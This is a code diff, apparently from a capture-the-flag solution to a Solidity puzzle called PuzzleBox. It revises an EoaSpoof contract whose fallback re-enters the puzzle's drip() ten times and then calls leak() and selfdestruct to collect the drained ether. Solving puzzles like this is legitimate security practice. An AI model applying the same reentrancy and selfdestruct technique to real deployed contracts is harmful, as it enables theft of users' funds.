@@ -13,19 +13,7 @@ contract PuzzleBoxSolution {
 
         EoaSpoof eoaSpoof = new EoaSpoof(puzzle);
         eoaSpoof.reenterDrip();
-
-        address payable[] memory friends = new address payable[](2);
-        uint256[] memory friendsCutBps = new uint256[](friends.length);
-        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
-        friends[1] = payable(0xC817dD2a5daA8f790677e399170c92AabD044b57);
-        friendsCutBps[0] = 0.015e4;
-        friendsCutBps[1] = 0.0075e4;
-        puzzle.spread(friends, friendsCutBps);
-
-        // eoaSpoof.destro();
-        
-        // puzzle.creep();
-        
+                
         uint256[] memory torchees = new uint256[](6);
         torchees[0] = 2; 
         torchees[1] = 4;
@@ -42,7 +30,18 @@ contract PuzzleBoxSolution {
         ));
         require(r);
 
-        // (bool s,) = proxy.call(abi.encode(puzzle.zip.selector));
+        // (bool s,) = proxy.call(abi.encode(puzzle.zip.selector)); // doesn't revert everything
+        puzzle.zip();
+
+        // puzzle.creep();
+
+        // address payable[] memory friends = new address payable[](2);
+        // uint256[] memory friendsCutBps = new uint256[](friends.length);
+        // friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
+        // friends[1] = payable(0xC817dD2a5daA8f790677e399170c92AabD044b57);
+        // friendsCutBps[0] = 0.015e4;
+        // friendsCutBps[1] = 0.0075e4;
+        // puzzle.spread(friends, friendsCutBps);
     }
 }
 
@@ -51,7 +50,6 @@ contract EoaSpoof {
     PuzzleBox puzzle;
 
     uint256 reentranceCounter;
-    uint256 public test;
     
     constructor(PuzzleBox _puzzle) {
         puzzle = _puzzle;
@@ -70,22 +68,26 @@ contract EoaSpoof {
         puzzle.drip{ value: 101 }();
     }
 
-    function destro() external {
-        selfdestruct(payable(address(msg.sender)));
+    function destro(address puzl, address solution) external {
+        puzzle.leak();
+        payable(address(uint160(puzl) + uint160(2))).call{ value: 1 }('');
+        selfdestruct(payable(solution));
     }
 
     // fallback accepts drained ETH and exploits reentrancy vulnerability in puzzle's drip()
     fallback() external payable {
-        reentranceCounter++;
+        ++reentranceCounter;
 
         // reenter 10 times to raise lastDripId to 10
         if (reentranceCounter < 10) {
             puzzle.drip{ value: 101 }();
         }
-        if (reentranceCounter == 10) {
 
-            address(0x0).call{value: 33}('');
-            test = address(this).balance;
+        // on last reentry
+        if (reentranceCounter == 10) {            
+            ++reentranceCounter;
+            
+            this.destro(msg.sender, tx.origin);
         }
     }
 }
